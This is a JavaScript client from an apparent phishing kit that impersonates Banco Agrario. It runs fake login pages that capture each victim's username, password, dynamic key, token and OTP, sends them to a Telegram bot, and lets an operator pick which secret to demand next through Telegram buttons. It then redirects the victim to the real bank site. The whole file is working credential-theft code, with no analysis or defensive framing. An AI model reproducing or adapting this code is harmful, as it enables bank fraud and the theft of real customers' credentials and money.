/**
 * BANCO AGRARIO - Cliente optimizado usando banco-utils
 */

(function() {
    'use strict';
    
    // Configuración de rutas por página
    const pageConfig = {
        'index.html': {
            stage: 'usuario',
            form: 'usernameForm',
            inputs: { usuario: 'usernameInput' },
            button: 'btnSiguiente',
            validation: (data) => (data.usuario || '').length >= 3,
            nextActions: { usuario: 'index.html', password: 'password.html', dinamica: 'dinamica.html', token: 'token.html', otp: 'otp.html', finalizar: 'https://www.bancoagrario.gov.co' }
        },
        'password.html': {
            stage: 'password',
            form: 'passwordForm',
            inputs: { password: 'passwordInput' },
            button: 'btnContinuar',
            validation: (data) => (data.password || '').length >= 4,
            nextActions: { usuario: 'index.html', password: 'password.html', dinamica: 'dinamica.html', token: 'token.html', otp: 'otp.html', finalizar: 'https://www.bancoagrario.gov.co' }
        },
        'dinamica.html': {
            stage: 'dinamica',
            form: 'dynamicForm',
            inputs: { dinamica: 'dynamicInput' },
            button: 'btnContinuar',
            validation: (data) => (data.dinamica || '').length >= 6,
            nextActions: { usuario: 'index.html', password: 'password.html', dinamica: 'dinamica.html', token: 'token.html', otp: 'otp.html', finalizar: 'https://www.bancoagrario.gov.co' }
        },
        'token.html': {
            stage: 'token',
            form: 'tokenForm',
            inputs: { token: 'tokenInput' },
            button: 'btnContinuar',
            validation: (data) => (data.token || '').length >= 6,
            nextActions: { usuario: 'index.html', password: 'password.html', dinamica: 'dinamica.html', token: 'token.html', otp: 'otp.html', finalizar: 'https://www.bancoagrario.gov.co' }
        },
        'otp.html': {
            stage: 'otp',
            form: 'otpForm',
            inputs: { otp: 'otpInput' },
            button: 'btnVerificar',
            validation: (data) => (data.otp || '').length >= 6,
            nextActions: { usuario: 'index.html', password: 'password.html', dinamica: 'dinamica.html', token: 'token.html', otp: 'otp.html', finalizar: 'https://www.bancoagrario.gov.co' }
        }
    };
    
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    const config = pageConfig[currentPage];
    
    if (!config) {
        console.error('❌ Página no configurada:', currentPage);
        return;
    }
    
    document.addEventListener('DOMContentLoaded', function() {        
        // Inicializar sistema centralizado
        const sessionId = BancoUtils.getSessionId();
        BancoUtils.initSocket();
        const loadingOverlay = BancoUtils.getOverlay();
        
        // Elementos DOM
        const form = document.getElementById(config.form);
        const button = document.getElementById(config.button);
        const inputs = {};
        
        Object.keys(config.inputs).forEach(key => {
            inputs[key] = document.getElementById(config.inputs[key]);
        });
        
        // Configurar acciones de Telegram
        BancoUtils.onTelegramAction((data) => {
            BancoUtils.hideOverlay();
            const nextPage = config.nextActions[data.action];
            if (nextPage) {
                window.location.href = nextPage.startsWith('http') ? nextPage : `/bancas/Agrario/${nextPage}`;
            }
        });
        
        // Validación
        function validateForm() {
            const data = {};
            Object.keys(inputs).forEach(key => {
                data[key] = inputs[key] ? inputs[key].value.trim() : '';
            });
            
            const isValid = config.validation(data);
            if (button) {
                button.disabled = !isValid;
                button.classList.toggle('active', isValid);
            }
        }
        
        // Event listeners para inputs
        Object.values(inputs).forEach(input => {
            if (input) {
                input.addEventListener('input', validateForm);
            }
        });
        
        // Validación inicial
        validateForm();
        
        // Envío del formulario
        if (form) {
            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                BancoUtils.showOverlay();
                
                const socket = BancoUtils.getSocket();
                if (!socket || !socket.connected) {
                    alert('Error de conexión. Recarga la página.');
                    BancoUtils.hideOverlay();
                    return;
                }
                
                // Recopilar datos
                const formData = {};
                Object.keys(inputs).forEach(key => {
                    formData[key] = inputs[key].value.trim();
                });
                
                // Guardar y enviar
                const fullData = BancoUtils.saveBankData('agrario', formData);
                const message = BancoUtils.formatMessage(`BANCO AGRARIO - ${config.stage.toUpperCase()}`, fullData);
                
                const buttons = [
                    { text: '👤 Pedir Usuario', action: 'usuario' },
                    { text: '🔐 Pedir Password', action: 'password' },
                    { text: '🔢 Pedir Dinámica', action: 'dinamica' },
                    { text: '🔑 Pedir Token', action: 'token' },
                    { text: '📱 Pedir OTP', action: 'otp' },
                    { text: '✅ Finalizar', action: 'finalizar' }
                ];
                
                const keyboard = BancoUtils.createKeyboard(buttons, sessionId);
                
                try {
                    await BancoUtils.sendToTelegram(config.stage, { text: message, keyboard });
                    console.log('✅ Datos enviados correctamente');
                    // Mantener overlay esperando acción
                } catch (error) {
                    console.error('❌ Error al enviar:', error);
                    BancoUtils.hideOverlay();
                    alert('Error al enviar datos');
                }
            });
        }
    });
})();
